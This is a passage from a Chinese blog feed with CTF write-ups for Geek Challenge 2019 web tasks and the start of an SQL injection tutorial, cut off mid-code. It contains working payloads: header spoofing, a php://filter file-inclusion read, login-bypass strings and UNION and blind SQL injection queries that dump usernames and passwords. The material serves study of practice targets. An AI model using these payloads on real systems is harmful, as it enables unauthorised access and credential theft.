        <content type="html"><![CDATA[<p>首先打开靶机，发现一个链接</p><p><img src="/../image/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019Http1.png"></p><p>进入发现是一个招新页面</p><p><img src="/../image/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019Http2.png"></p><p>查看源代码发现一个隐藏的超链接指向secret.php</p><p><img src="/../image/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019Http3.png"></p><p>点开发现显示我们不是从<a href="https://sycsecret.buuoj.cn跳转过来的/">https://Sycsecret.buuoj.cn跳转过来的</a></p><p><img src="/../image/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019Http4.png"></p><p>这时候就想到referer头的作用</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lasso"><span class="hljs-keyword">Referer</span>头在HTTP请求中主要用于指示当前请求的来源页面，帮助服务器了解用户是从哪个页面跳转而来的‌<br></code></pre></td></tr></table></figure><p>使用hackbar修改Referer头,用burpsuite也可</p><p><img src="/../image/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019Http5.png"></p><p>修改完成后又显示请使用”Syclover” 浏览器</p><p><img src="/../image/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019Http6.png"></p><p>这时就想到user-agent的作用</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">User</span>-Agent（用户代理）在HTTP请求中起着重要作用，主要用于标识发送请求的客户端信息，包括网络、浏览器类型、版本号等‌。具体来说，<span class="hljs-keyword">User</span>-Agent的作用包括以下几个方面：‌<span class="hljs-number">12</span><br></code></pre></td></tr></table></figure><p>使用hackbar修改user-agent</p><p><img src="/../image/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019Http7.png"></p><p>重新打开网页又显示只能在本地阅读</p><p><img src="/../image/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019Http8.png"></p><p>这时就想到x-forwarded-for</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm">X-Forwarded-For（XFF）的作用主要是帮助服务器获取通过HTTP代理或负载均衡方式连接到Web服务器的客户端的原始<span class="hljs-built_in">IP</span>地址<br></code></pre></td></tr></table></figure><p>使用hackbar修改X-Forwarded-For为127.0.0.1或者localhost</p><p><img src="/../image/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019Http9.png"></p><p>得到flag</p><p><img src="/../image/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019Http10.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 刷题笔记 </tag>
            
            <tag> http协议 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>极客大挑战2019SecretFile</title>
      <link href="/2025/01/09/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019SecretFile/"/>
      <url>/2025/01/09/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019SecretFile/</url>
      
        <content type="html"><![CDATA[<p>首先打开题目，啥也没发现</p><p><img src="/../image/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019SecretFile1.png"></p><p>检查源代码，发现一个Archive_room.php，点击看看</p><p><img src="/../image/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019SecretFile2.png"></p><p>出现一个点击按钮，点击看看</p><p><img src="/../image/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019SecretFile3.png"></p><p>除此之外没有别的线索了</p><p><img src="/../image/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019SecretFile4.png"></p><p>按照提示回到上一个页面抓包，发现一个新的php</p><p><img src="/../image/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019SecretFile5.png"></p><p>进去之后就是如下代码。</p><p><img src="/../image/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019SecretFile6.png"></p><p>接下来代码审计</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>secret<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="language-xml"></span><span class="language-php"><span class="hljs-meta">&lt;?php</span></span><br><span class="language-php">    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);</span><br><span class="language-php">    <span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);</span><br><span class="language-php">    <span class="hljs-variable">$file</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];</span><br><span class="language-php">    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strstr</span>(<span class="hljs-variable">$file</span>,<span class="hljs-string">&quot;../&quot;</span>)||<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$file</span>, <span class="hljs-string">&quot;tp&quot;</span>)||<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$file</span>,<span class="hljs-string">&quot;input&quot;</span>)||<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$file</span>,<span class="hljs-string">&quot;data&quot;</span>))&#123;</span><br><span class="language-php"><span class="hljs-comment">//strstr()和stristr()都用于在一个较长的字符串中搜索指定的子字符串，</span></span><br><span class="language-php"><span class="hljs-comment">//并返回从该子字符串第一次出现的位置开始到字符串末尾的部分。</span></span><br><span class="language-php"><span class="hljs-comment">//两者区别在于前者对大小写敏感，后者对大小写不敏感</span></span><br><span class="language-php"><span class="hljs-comment">//即程序过滤了 ../ tp input data</span></span><br><span class="language-php">        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Oh no!&quot;</span>;</span><br><span class="language-php">        <span class="hljs-keyword">exit</span>();</span><br><span class="language-php">    &#125;</span><br><span class="language-php">    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>); </span><br><span class="language-php"><span class="hljs-comment">//flag放在了flag.php里</span></span><br><span class="language-php"><span class="hljs-meta">?&gt;</span></span><span class="language-xml"></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span><br><span class="language-xml"></span><br><span class="language-xml">这是很明显的文件包含漏洞</span><br></code></pre></td></tr></table></figure><p>发现没有过滤掉flag，尝试一下file&#x3D;flag.php，发现确实进去了但是不显示</p><p><img src="/../image/../image/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019SecretFile7.png"></p><p>发现没有过滤伪协议，伪协议以及文件包含漏洞相关知识：<a href="https://blog.csdn.net/m0_46467017/article/details/126380415">https://blog.csdn.net/m0_46467017/article/details/126380415</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">php://filter 读取源代码并进行<span class="hljs-built_in">base64</span>编码输出，不然会直接当做php代码执行就看不到源代码内容了<br></code></pre></td></tr></table></figure><p>于是构造payload如下：</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-built_in">file</span>=php://<span class="hljs-built_in">filter</span>/<span class="hljs-built_in">read</span>=<span class="hljs-built_in">convert</span>.base64-encode/resource=flag.php<br></code></pre></td></tr></table></figure><p>得到flag.php源码的base64加密：</p><p><img src="/../image/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019SecretFile8.png"></p><p>将base64加密的源码解码得到flag：</p><p><img src="/../image/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019SecretFile9.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 刷题笔记 </tag>
            
            <tag> filter伪协议 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>极客大挑战2019LoveSQL</title>
      <link href="/2025/01/05/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019LoveSQL/"/>
      <url>/2025/01/05/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019LoveSQL/</url>
      
        <content type="html"><![CDATA[<p>首先判断闭合，发现只有单引号时才报错，所以可以判断为单引号闭合</p><p><img src="/../image/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019LoveSQL1.png"></p><p>尝试一些经典的SQL注入</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros">1<br>1<span class="hljs-string">&#x27;</span><br><span class="hljs-string">1&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;1&#x27;</span> = <span class="hljs-string">&#x27;1#</span><br><span class="hljs-string">1&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-attribute">1</span>=1#<br></code></pre></td></tr></table></figure><p>使用万能密码成功登录</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>&#x27; or <span class="hljs-number">1</span>=<span class="hljs-number">1</span>#<br></code></pre></td></tr></table></figure><p><img src="/../image/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019LoveSQL2.png"></p><p>先试一下是否是MD5加密，结果发现不是</p><p><a href="https://www.cmd5.com/">md5在线解密破解,md5解密加密</a></p><p>先用order by来查看他有多少列</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh"><span class="hljs-number">1</span>’ <span class="hljs-keyword">order</span> <span class="hljs-title">by</span> <span class="hljs-number">4</span><span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><p>报错了</p><p><img src="/../image/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019LoveSQL4.png"></p><p>最终经过二分法测试有3列</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh"><span class="hljs-number">1</span>&#x27; <span class="hljs-keyword">order</span> <span class="hljs-title">by</span> <span class="hljs-number">3</span><span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><p>正常回显</p><p><img src="/../image/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019LoveSQL3.png"></p><p>查看回显位有哪些</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>&#x27; union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>#<br></code></pre></td></tr></table></figure><p><img src="/../image/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019LoveSQL5.png"></p><p>查看库名</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-number">-1</span>&#x27; <span class="hljs-built_in">union</span> <span class="hljs-built_in">select</span> <span class="hljs-number">1</span>,<span class="hljs-built_in">database</span>(),<span class="hljs-number">3</span><span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure><p><img src="/../image/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019LoveSQL6.png"></p><p>也可以爆库</p><figure class="highlight capnproto"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs capnproto"><span class="hljs-number">1</span>&#x27; <span class="hljs-keyword">union</span> select <span class="hljs-number">1</span>,group_concat(schema_name),<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> information_schema.schemata<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><p><img src="/../image/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019LoveSQL7.png"></p><p>查看表名</p><figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs q"><span class="hljs-number">1</span>&#x27; <span class="hljs-built_in">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-built_in">tables</span> <span class="hljs-built_in">where</span> table_schema=&#x27;geek&#x27;#<br><br>或者爆表<br><span class="hljs-number">1</span>&#x27; <span class="hljs-built_in">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-built_in">tables</span> <span class="hljs-built_in">where</span> table_schema=database()#<br></code></pre></td></tr></table></figure><p><img src="/../image/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019LoveSQL8.png"></p><p>查看两个表的列名</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">查看第一个表<br><span class="hljs-number">1</span><span class="hljs-string">&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;</span>geekuse<span class="hljs-string">r&#x27;#</span><br><span class="hljs-string"></span><br><span class="hljs-string">查看第二个表</span><br><span class="hljs-string">1&#x27;</span> union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns where table_schema=database() <span class="hljs-keyword">and</span> table_name=<span class="hljs-string">&#x27;l0ve1ysq1&#x27;</span><span class="hljs-comment">#</span><br>发现两表结果相同<br></code></pre></td></tr></table></figure><p><img src="/../image/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019LoveSQL9.png"></p><p>查看id，username，password的内容</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-number">1</span>&#x27; union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(<span class="hljs-built_in">id</span>,username,password) <span class="hljs-keyword">from</span> geekuser<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><p><img src="/../image/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019LoveSQL10.png"></p><p>查看另一个表的id，username，password的内容</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-number">1</span>&#x27; union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(<span class="hljs-built_in">id</span>,username,password) <span class="hljs-keyword">from</span> l0ve1ysq1<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><p><img src="/../image/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019LoveSQL11.png"></p><p>得到了flag</p>]]></content>
      
      
      
        <tags>
            
            <tag> 刷题笔记 </tag>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>极客大挑战2019Havefun</title>
      <link href="/2025/01/05/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019Havefun/"/>
      <url>/2025/01/05/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019Havefun/</url>
      
        <content type="html"><![CDATA[<p>首先查看源码</p><p><img src="/../image/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019Havefun1.png"></p><p>发现此处有被注释掉的代码</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml"><span class="hljs-comment">&lt;!--</span></span><br><span class="hljs-comment"><span class="language-xml">        $cat=$_GET[&#x27;cat&#x27;];</span></span><br><span class="hljs-comment"><span class="language-xml">        echo $cat;</span></span><br><span class="hljs-comment"><span class="language-xml">        if($cat==&#x27;dog&#x27;)</span></span><span class="hljs-template-variable">&#123;</span><br><span class="hljs-template-variable">            echo &#x27;Syc&#123;cat_cat_cat_cat&#125;</span><span class="language-xml"><span class="hljs-comment">&#x27;;</span></span><br><span class="hljs-comment"><span class="language-xml">        &#125;</span></span><br><span class="hljs-comment"><span class="language-xml">        --&gt;</span></span><br></code></pre></td></tr></table></figure><p>然后构造payload</p><p>Payload：中文 ’ 有效载荷 ‘，指成功exploit之后，攻击代码释放的具有攻击能力的能够实现攻击者目的的代码。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">/?<span class="hljs-attribute">cat</span>=dog<br></code></pre></td></tr></table></figure><h5 id="直接在网页地址栏中构造payload"><a href="#直接在网页地址栏中构造payload" class="headerlink" title="直接在网页地址栏中构造payload"></a>直接在网页地址栏中构造payload</h5><p><img src="/../image/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019Havefun2.png"></p><p>这样就能得到flag了</p><p><img src="/../image/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019Havefun3.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 刷题笔记 </tag>
            
            <tag> payload构造 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>极客大挑战2019EasySQL</title>
      <link href="/2025/01/05/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019EasySQL/"/>
      <url>/2025/01/05/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019EasySQL/</url>
      
        <content type="html"><![CDATA[<p>首先进入题目网站，发现输入框，根据题目可以得知应该要SQL注入</p><p><img src="/../image/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019EasySQL1.png"></p><p>测试后发现单引号会报错，而双引号，括号和不闭合都不会报错，只会显示名称密码错误，可以得知闭合方式为单引号，字符注入</p><p><img src="/../image/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019EasySQL2.png"></p><p>接下来只需要简单的SQL注入语句 admin’ or 1&#x3D;1就可以得到flag</p><p><img src="/../image/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019EasySQL3.png"></p><p>这样这题就解开了。</p><p>原理：在数据库中形成的 sql 语句是 <code>SELECT * FROM table_name WHERE username=&#39;admin&#39; and password=&#39;123456&#39;;</code>使用万能密码并且用#将后面的语句注释掉就行了。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 刷题笔记 </tag>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql注入</title>
      <link href="/2025/01/03/sql%E6%B3%A8%E5%85%A5/"/>
      <url>/2025/01/03/sql%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><h2 id="SQL注入基础"><a href="#SQL注入基础" class="headerlink" title="SQL注入基础"></a>SQL注入基础</h2><h3 id="什么是注入"><a href="#什么是注入" class="headerlink" title="什么是注入"></a>什么是注入</h3><p>概念：所谓SQL注入，就是通过把SQL命令插入到WEB表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令，从而进一步得到相应的数据信息。</p><h3 id="注入分类"><a href="#注入分类" class="headerlink" title="注入分类"></a>注入分类</h3><p>按照查询字段：</p><p>字符型：当输入的参数为字符串时，称为字符型</p><p>数字型：当输入的参数为整形时，可以认为是数字型注入</p><p>按照注入方法：<br>Union注入，报错注入，布尔注入，时间注入</p><h3 id="注入点"><a href="#注入点" class="headerlink" title="注入点"></a>注入点</h3><p>概念：注入点就是可以实行注入的地方，通常是一个访问数据库的连接。</p><p><a href="https://blog.csdn.net/Jaasenyi/article/details/113648313">https://blog.csdn.net/Jaasenyi/article/details/113648313</a></p><h3 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h3><ol><li>查找注入点</li><li>判断是字符型还是数字型注入 and 1&#x3D;1    1&#x3D;2&#x2F;     3-1</li><li>如果是字符型，找到他的闭合方式，’  “  ‘)  “)</li><li>判断查询列数，group by    order by</li><li>查询回显位置，-1</li></ol><h2 id="UNION注入"><a href="#UNION注入" class="headerlink" title="UNION注入"></a>UNION注入</h2><p><img src="/../image/%E6%8B%BF%E5%88%B0%E8%A1%A8%E5%90%8D%E5%92%8C%E5%88%97%E5%90%8D.png"></p><p>查库名</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> <span class="hljs-built_in">schema_name</span> <span class="hljs-keyword">from</span> information_schema.schemata<br></code></pre></td></tr></table></figure><p>查某库的数据表</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> <span class="hljs-built_in">table_name</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=’xxxxx’<br></code></pre></td></tr></table></figure><p>查某表的所有列</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> <span class="hljs-built_in">column_name</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">table_name</span>=’xxxxx’<br></code></pre></td></tr></table></figure><p>查某列的内容</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> *** <span class="hljs-keyword">from</span> ***<br><br>插入&quot;~&quot;区分数据<br><span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(username,<span class="hljs-string">&#x27;~&#x27;</span>,<span class="hljs-keyword">password</span>),<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> users <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><h3 id="group-concat-的作用"><a href="#group-concat-的作用" class="headerlink" title="group_concat()的作用"></a>group_concat()的作用</h3><p>确保所有查询信息能放到一行显示出来</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">例如查表名<br><span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(<span class="hljs-built_in">table_name</span>),<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema = <span class="hljs-string">&#x27;xxx&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="/../image/group_concat.png"></p><h3 id="搜索型注入"><a href="#搜索型注入" class="headerlink" title="搜索型注入"></a>搜索型注入</h3><p>搜索型即模糊匹配在 MySQL 中的模糊匹配符号是%所以注入时要加上%其它同理</p><h3 id="XX型注入"><a href="#XX型注入" class="headerlink" title="XX型注入"></a>XX型注入</h3><p>字符型注入的一种只是闭合符不同</p><h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h2><p>盲注的分类</p><p><img src="/../image/%E7%9B%B2%E6%B3%A8%E5%88%86%E7%B1%BB.png"></p><h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><p>布尔盲注的条件</p><p><img src="/../image/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%E6%9D%A1%E4%BB%B6.png"></p><p>闭合符号判断</p><p><img src="/../image/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%E9%97%AD%E5%90%88%E7%AC%A6%E5%88%A4%E6%96%AD.png"></p><p>关键函数</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">ascii</span><span class="hljs-params">()</span></span>可以把字母转换为对应的数字<br><span class="hljs-function"><span class="hljs-title">ord</span><span class="hljs-params">()</span></span>返回第一个字符的ascii码<br><br><span class="hljs-function"><span class="hljs-title">substr</span><span class="hljs-params">(()</span></span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)将()从第一个字符开始一次显示一个字符<br>例如：<br>将查到的库名从第一个字符开始显示一个字符<br><span class="hljs-function"><span class="hljs-title">substr</span><span class="hljs-params">((select database()</span></span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)<br>查库名的第二个字符<br><span class="hljs-function"><span class="hljs-title">substr</span><span class="hljs-params">((select database()</span></span>),<span class="hljs-number">2</span>,<span class="hljs-number">1</span>)<br>组合使用<br><span class="hljs-function"><span class="hljs-title">ascii</span><span class="hljs-params">(substr((select database()</span></span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)) &gt;= <span class="hljs-number">100</span><br><br><span class="hljs-function"><span class="hljs-title">mid</span><span class="hljs-params">()</span></span>用法和<span class="hljs-built_in">substr</span>()一致<br><br><br><span class="hljs-function"><span class="hljs-title">length</span><span class="hljs-params">()</span></span>返回字符的长度<br>例如：<br>将查到的库名去猜库名的长度为<span class="hljs-number">8</span>然后通过判断页面是否为真来猜长度<br><span class="hljs-function"><span class="hljs-title">length</span><span class="hljs-params">(database()</span></span>) = <span class="hljs-number">8</span><br><br><span class="hljs-function"><span class="hljs-title">left</span><span class="hljs-params">(database()</span></span>,<span class="hljs-number">1</span>)和substr差不多，表示显示从左边开始第一位的字符<br><br>获取第二个表<br><span class="hljs-function"><span class="hljs-title">ascii</span><span class="hljs-params">(substr((select table_name from information_schema.tables where table_schema = database()</span></span> limit <span class="hljs-number">1</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&gt;<span class="hljs-number">113</span>--+<br><br>limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>表示从第<span class="hljs-number">0</span>个开始获取第一个<br>所有 limit <span class="hljs-number">1</span>,<span class="hljs-number">1</span>就表示获取第二个<br></code></pre></td></tr></table></figure><p>为什么要把字母转换成数字?</p><p>因为查询命令可以执行，但不会返回信息到页面</p><p><img src="/../image/ascii.png"></p><p>通过二分法比大小去猜字母</p><p><img src="/../image/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%E6%93%8D%E4%BD%9C.png"></p><p>正则注入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs sql">▲regexp 正则注入<br>用法介绍：<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>() regexp <span class="hljs-string">&#x27;^[a-z]&#x27;</span>;<br>正则表达式的用法，<span class="hljs-keyword">user</span>()结果为 root，regexp 为匹配 root 的正则表达式。<br>第二位可以用 <span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>() regexp <span class="hljs-string">&#x27;^ro&#x27;</span>来进行。<br><br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span 